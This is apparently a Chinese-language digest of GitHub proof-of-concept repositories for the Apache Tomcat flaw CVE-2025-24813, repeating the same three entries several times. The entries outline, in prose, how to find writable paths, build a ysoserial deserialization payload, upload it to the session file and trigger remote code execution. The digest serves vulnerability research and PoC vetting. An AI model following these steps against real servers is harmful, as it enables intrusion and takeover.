**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
*   `main.py`  脚本尝试通过PUT请求写入文件，可能会写入恶意代码或后门。虽然脚本主要目的是RCE，但存在修改文件内容的潜在风险。

总体而言，PoC 本身主要是为了演示漏洞，但从外部源下载 ysoserial 存在一定的风险。使用者应谨慎对待。

**利用方式：**

1.  **检查可写性:** 首先，确定目标 Tomcat 服务器上的默认 Servlet 是否启用了写入权限，并且支持 partial PUT 请求。
2.  **生成 Payload:**  使用 ysoserial 或其他工具，根据目标应用程序中存在的库，生成一个恶意的 Java 序列化 Payload，该 Payload 包含要执行的命令。
3.  **上传 Payload:**  将生成的 Payload 通过 PUT 请求上传到 Tomcat 服务器，利用 partial PUT 功能将 Payload 写入到 session 文件中。
4.  **触发反序列化:**  通过构造特定的 HTTP 请求，访问包含恶意 Payload 的 session 文件，触发 Java 反序列化漏洞，从而执行 Payload 中的命令。

该漏洞允许攻击者在目标服务器上执行任意代码，从而完全控制系统。如果无法直接执行代码，攻击者还可以利用该漏洞进行信息泄露，读取敏感文件，或者修改服务器上的文件。

**项目地址:** [yaleman/cve-2025-24813-poc](https://github.com/yaleman/cve-2025-24813-poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---



---

## POC #50

**来源**: [CVE-2025-24813-x00byte_PutScanner.md](../2025/CVE-2025-24813-x00byte_PutScanner.md)

## CVE-2025-24813-Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. 可能需要应用程序使用Tomcat基于文件的会话持久化，且使用默认存储位置
4. 可能需要应用程序包含一个可以被反序列化攻击利用的库。
5. 对于信息泄露，目标URL要是公共上传URL的子目录。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，源于对包含内部点（例如 file.Name）的文件路径处理不当。如果满足特定条件，攻击者可能利用此漏洞执行远程代码或泄露敏感信息。

**有效性：**
根据漏洞描述和搜索结果，此漏洞的利用需要满足多个前提条件，包括启用默认servlet的写入功能，支持部分PUT请求，以及应用程序特定的配置或依赖。提供的POC代码是一个目录扫描器，用于查找可使用PUT方法写入的目录，是漏洞利用的前期步骤，本身并不能直接触发RCE或者信息泄露，需要进一步利用PUT上传恶意文件覆盖session或者其他敏感文件才能达到目的。综合搜索结果，此漏洞确实存在利用实例。

**投毒风险：**
查看代码，该POC主要用于扫描目标服务器上的可写目录，并不会主动上传后门代码。投毒风险主要来自于使用者在找到可写目录后，自行构造恶意payload上传，并非POC本身包含恶意代码。 `PutScanner` 仓库中的投毒风险较低，主要风险在于使用者利用该工具扫描后进行恶意操作，因此我估计的投毒风险为5%。

**利用方式：**
1.  **扫描可写目录：** 使用`putscanner.py`扫描目标Tomcat服务器，寻找可以使用HTTP PUT方法写入的目录。
2.  **信息泄露：** 如果启用了默认Servlet的写入功能，支持部分PUT请求，且攻击者已知安全敏感文件的名称并能通过部分PUT上传，则可能读取或修改这些文件。
3.  **远程代码执行 (RCE):**  如果启用了默认Servlet的写入功能，支持部分PUT请求，应用使用了Tomcat的文件会话持久化机制，且应用包含可被反序列化攻击的库，攻击者可以通过上传包含恶意序列化对象的会话文件来执行任意代码。
   *   攻击者首先需要找到Tomcat用于存储Session的文件目录 (默认在`$CATALINA_BASE/work/Catalina/localhost/[appname]/SESSIONS.ser`)。
   *   然后，攻击者可以通过PUT请求上传恶意的Session文件覆盖原有的Session文件。
   *   当Tomcat反序列化恶意Session文件时，即可触发RCE。

总结：利用此漏洞的关键在于找到可写目录，并根据应用环境选择合适的payload（例如恶意的session对象）进行上传。

**项目地址:** [x00byte/PutScanner](https://github.com/x00byte/PutScanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #51

**来源**: [CVE-2025-24813-x1ongsec_CVE-2025-24813.md](../2025/CVE-2025-24813-x1ongsec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足以下全部条件：1. DefaultServlet 写入功能已启用 (默认关闭)；2. 支持 partial PUT 请求 (默认开启)；3. 使用 Tomcat 文件会话持久化和默认存储位置；4. 应用包含存在反序列化漏洞的库。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以通过 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。利用此漏洞需要DefaultServlet开启写入，支持partial PUT，且应用使用了Tomcat的文件会话保持，并包含可被利用的反序列化库。提供的POC首先上传包含恶意序列化数据的分块文件到会话文件存储位置，然后通过访问触发反序列化。

**漏洞利用方式：**

1.  **前提条件检查：** 确保目标Tomcat实例满足漏洞利用的全部条件，包括DefaultServlet启用写入，支持partial PUT，使用了默认的文件会话存储位置，以及包含可利用的反序列化库。
2.  **会话ID获取：** 访问Tomcat应用获取JSESSIONID Cookie，用于后续的会话文件操作。
3.  **恶意序列化数据准备：** 构造包含恶意代码的序列化对象，该对象利用目标应用中的反序列化漏洞执行任意代码。
4.  **分块上传恶意数据：** 使用PUT请求，通过Content-Range头部指定分块大小，将恶意序列化数据分块上传到Tomcat的会话文件存储位置，文件名通常与JSESSIONID相关。
5.  **触发反序列化：** 通过发送包含特定JSESSIONID Cookie的GET请求或其他HTTP请求，触发Tomcat加载和反序列化之前上传的恶意会话文件，从而执行恶意代码。

**投毒风险分析：**

该仓库主要提供复现环境和PoC，本身的代码较为简单，但存在一定的投毒风险：
* **复现环境配置修改：** 作者为了方便漏洞复现，提供的环境配置可能包含潜在的安全风险，例如，默认开启了DefaultServlet的写入功能，这本身就是一个不安全的配置。
* **恶意序列化数据构造：** PoC的关键在于恶意序列化数据的构造，攻击者可能在构造过程中引入隐藏的后门代码，例如，通过ClassLoader加载远程恶意类，从而实现更隐蔽的远程代码执行。PoC中需要自行构造反序列化文件内容，作者可能并未提供完整的反序列化利用链，需要自行寻找或构造，存在一定门槛，因此投毒的概率较低，估计在20%左右。

总的来说，该漏洞利用的有效性取决于目标环境的配置和应用依赖，利用方式相对复杂，需要一定的技术积累。虽然该复现环境主要用于学习研究，但依然存在一定的投毒风险，需要谨慎使用。

**项目地址:** [x1ongsec/CVE-2025-24813](https://github.com/x1ongsec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #52

**来源**: [CVE-2025-24813-yaleman_cve-2025-24813-poc.md](../2025/CVE-2025-24813-yaleman_cve-2025-24813-poc.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT (enabled by default), application uses Tomcat's file based session persistence with default storage location, application includes a library that may be leveraged in a deserialization attack

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者通过具有写权限的默认 Servlet 执行远程代码或进行信息泄露。漏洞利用的关键在于 Tomcat 的 partial PUT 功能和文件型 session 持久化机制。 

**有效性分析：**

根据漏洞描述和搜索结果，该漏洞利用依赖于几个前提条件：

1.  默认 Servlet 必须启用写入权限（默认禁用，需要配置）。
2.  必须支持 partial PUT （默认启用）。
3.  应用程序必须使用 Tomcat 的文件型 session 持久化，且使用默认存储位置。
4.  应用程序需要包含一个可用于反序列化攻击的库（例如，存在已知的 ysoserial gadget）。

提供的 PoC 代码（main.py）尝试模拟这些步骤：

1.  检查目标 Servlet 是否可通过 PUT 请求写入。
2.  生成恶意的 Java 序列化 payload （通过 ysoserial）。
3.  上传 payload 作为 session 文件。
4.  通过访问 session 文件触发反序列化。

搜索结果表明，CVE-2025-24813 漏洞在野外已被积极利用。 多个博客文章 (rapid7, recordedfuture, akamai, keysight, wiz, zscaler, sonicwall, xmcyber) 都描述了该漏洞以及检测和缓解方法。

**投毒风险分析：**

分析提供的PoC代码，存在一定的投毒风险，约为10%：

*   `download.sh` 脚本会从外部源（`https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar`）下载 `ysoserial-all.jar`。虽然 ysoserial 是一个合法的漏洞利用工具，但下载过程中存在被中间人攻击或恶意软件替换的风险。该脚本在下载后会检查文件是否为有效的 JAR 文件，但不能完全保证其安全性。
